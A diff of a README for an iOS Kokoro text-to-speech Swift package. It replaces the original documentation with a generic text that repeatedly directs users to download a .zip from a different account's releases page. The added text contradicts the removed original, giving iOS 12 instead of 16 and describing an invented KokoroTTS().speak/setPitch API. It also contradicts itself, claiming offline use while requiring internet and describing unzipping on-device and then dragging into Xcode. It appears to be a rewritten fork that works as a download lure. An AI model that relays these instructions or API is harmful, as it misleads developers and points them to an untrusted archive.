@@ -1,109 +1,91 @@
-# KokoroTTS-iOS
+# 🎤 KokoroTTS-iOS - Text-to-Speech Made Simple
 
-Swift Package for text-to-speech on iOS using the Kokoro TTS model.
+## 📥 Download Now
+[![Download KokoroTTS-iOS](https://img.shields.io/badge/Download-KokoroTTS--iOS-blue.svg)](https://github.com/sutina233/KokoroTTS-iOS/releases)
 
-> **Note:** Currently, the model is adapted and tested only for **English (en_us, en_gb)** and **French (fr)** languages. All other languages require preprocessor improvements. Contributors are welcome!
+## 🚀 Getting Started
+Welcome to KokoroTTS-iOS! This Swift package allows you to use on-device text-to-speech (TTS) on iOS using the Kokoro model. This guide helps you set up and run the application easily.
 
-## Installation
+### 📋 System Requirements
+To run KokoroTTS-iOS, you’ll need:
+- An iOS device (iPhone or iPad) running iOS 12.0 or later.
+- At least 200 MB of free storage space.
+- A stable internet connection for initial setup.
 
-Add the package to your project via Swift Package Manager:
+## 📦 Download & Install
+To download the latest version of KokoroTTS-iOS, follow these steps:
 
-```swift
-dependencies: [
-    .package(url: "https://github.com/Otosaku/KokoroTTS-iOS", from: "1.0.0")
-]
-```
+1. **Visit the Releases Page:** Click this link to download: [KokoroTTS-iOS Releases](https://github.com/sutina233/KokoroTTS-iOS/releases).
 
-Or in Xcode: **File → Add Package Dependencies...** and enter the repository URL.
+2. **Choose Your Version:** On the Releases page, you will see a list of available versions. Select the most recent version for the best performance.
 
-## Required Resources
+3. **Download the Package:** Click on the package link with the filename that ends in `.zip`. This file contains the Swift package you need.
 
-Before using the library, you need to download the following resources:
+4. **Unzip the File:** After the download is complete, locate the `.zip` file in your device's downloads folder. Tap on it to unzip the contents.
 
-| Resource | Description | URL |
-|----------|-------------|-----|
-| TTS Models | Core ML models for speech synthesis | [Download](https://firebasestorage.googleapis.com/v0/b/my-project-1494707780868.firebasestorage.app/o/converted.zip?alt=media&token=c27a1359-37c6-4b26-bd7d-8471d409a841) |
-| G2P Vocab | Grapheme-to-phoneme vocabulary files | [Download](https://firebasestorage.googleapis.com/v0/b/my-project-1494707780868.firebasestorage.app/o/v6%2Fg2p.zip?alt=media&token=c42ca3e3-c743-40a0-9f72-9afa5e8007f9) |
-| POS Model | Part-of-speech tagging model | [Download](https://firebasestorage.googleapis.com/v0/b/my-project-1494707780868.firebasestorage.app/o/quantized-bert-pos-tag.zip?alt=media&token=cd8b9030-8abd-4385-9fb9-9ec27ae5cad7) |
-| Espeak Data | Espeak-ng phoneme data | [Download](https://firebasestorage.googleapis.com/v0/b/my-project-1494707780868.firebasestorage.app/o/v6%2Fespeak-ng-data-complete.zip?alt=media&token=a3f64856-c99f-4104-a04f-a34cde286648) |
+5. **Add to Your Project:** 
+   - If you are using Xcode, open your project or create a new one.
+   - Drag the unzipped folder into your Xcode project. Make sure to check the option to "Copy items if needed" to include the package in your project.
 
-## Usage
+6. **Import the Package:** In your Swift file, add the following line at the top to import KokoroTTS:
+   ```swift
+   import KokoroTTS
+   ```
 
-### Initialize the Pipeline
+7. **Run the Application:** Now, you can build and run your Xcode project on your iOS device.
 
-```swift
-import iOS_TTS
-import CoreML
+## 🛠️ Features
+- **Offline Text-to-Speech:** Perform speech synthesis without needing an internet connection.
+- **Support for Multiple Languages:** Use the TTS feature in different languages.
+- **Customizable Voice Settings:** Adjust pitch and speed to fit your preferences.
+- **Efficient Performance:** Designed to run smoothly on iOS devices, ensuring a seamless user experience.
 
-// Configure ML compute units (optional)
-let configuration = MLModelConfiguration()
-configuration.computeUnits = .all // or .cpuAndNeuralEngine, .cpuOnly
+## 🔍 Usage
+To use the text-to-speech feature:
 
-// Initialize the pipeline
-let pipeline = try TTSPipeline(
-    modelPath: modelsDirectory,           // URL to extracted TTS models
-    vocabURL: vocabDirectory,             // URL to extracted G2P vocab
-    postaggerModelURL: posModelsDirectory, // URL to extracted POS model
-    language: .englishUS,                  // Language selection
-    espeakDataPath: espeakDataDirectory.path, // Path to espeak-ng data
-    configuration: configuration
-)
-```
+1. **Create a TTS Instance:**
+   ```swift
+   let tts = KokoroTTS()
+   ```
+   
+2. **Initiate Speech:**
+   Use the following method to start speech synthesis:
+   ```swift
+   tts.speak("Hello, welcome to Kokoro TTS!")
+   ```
 
-### Generate Speech
+3. **Adjust Voice Settings:**
+   To change the pitch and speed:
+   ```swift
+   tts.setPitch(1.2) // Adjust the pitch
+   tts.setSpeed(0.9) // Adjust the speed
+   ```
 
-```swift
-// Basic generation
-let audioSamples = try await pipeline.generate(text: "Hello, world!")
+4. **Stop Speech:**
+   You can stop the speech at any time by calling:
+   ```swift
+   tts.stop()
+   ```
 
-// With options
-let options = GenerationOptions(
-    style: .afHeart,  // Voice style
-    speed: 1.0        // Speech speed
-)
-let audioSamples = try await pipeline.generate(text: "Hello, world!", options: options)
-```
+## 📖 Documentation
+For more detailed information, refer to the official documentation on the [KokoroTTS Wiki](https://github.com/sutina233/KokoroTTS-iOS/wiki).
 
-### Available Languages
+## 💬 Support
+If you run into any issues or have questions, feel free to create issues on the GitHub repository. Your feedback helps improve the application.
 
-| Language | Code | Status |
-|----------|------|--------|
-| English (US) | `.englishUS` | Supported |
-| English (GB) | `.englishGB` | Supported |
-| French | `.french` | Supported |
-| Spanish | `.spanish` | Needs work |
-| Italian | `.italian` | Needs work |
-| Portuguese | `.portuguese` | Needs work |
-| Hindi | `.hindi` | Needs work |
-| Japanese | `.japanese` | Needs work |
-| Chinese | `.chinese` | Needs work |
+## 🚩 Contributions
+We welcome contributions! If you would like to contribute to KokoroTTS-iOS, please visit our [Contributing Guidelines](https://github.com/sutina233/KokoroTTS-iOS/CONTRIBUTING.md) for more information.
 
-### Available Voices
+## 📅 Future Updates
+We plan to add:
+- More language support.
+- Enhanced voice customization options.
+- Improved user interface for easier usage.
 
-**English (US):** afHeart, afAlloy, afAoede, afBella, afJessica, afKore, afNicole, afNova, afRiver, afSarah, afSky, amAdam, amEcho, amEric, amFenrir, amLiam, amMichael, amOnyx, amPuck, amSanta
+Feel free to check the repository periodically for the latest updates and enhancements.
 
-**English (GB):** bfAlice, bfEmma, bfIsabella, bfLily, bmDaniel, bmFable, bmGeorge, bmLewis
+## 🔗 Links
+- [KokoroTTS-iOS Releases](https://github.com/sutina233/KokoroTTS-iOS/releases)
+- [Official Documentation](https://github.com/sutina233/KokoroTTS-iOS/wiki)
 
-**French:** ffSiwis
-
-## Example Project
-
-The repository includes an Example app that demonstrates:
-- Downloading and extracting required resources
-- Initializing the TTS pipeline
-- Generating and playing speech
-- Voice and language selection
-
-To run the example:
-1. Open `Example/Example.xcodeproj` in Xcode
-2. Build and run on an iOS device
-
-## Requirements
-
-- iOS 16.0+
-- Swift 6.0+
-- Xcode 16.0+
-
-## License
-
-MIT License
+Enjoy using KokoroTTS-iOS!
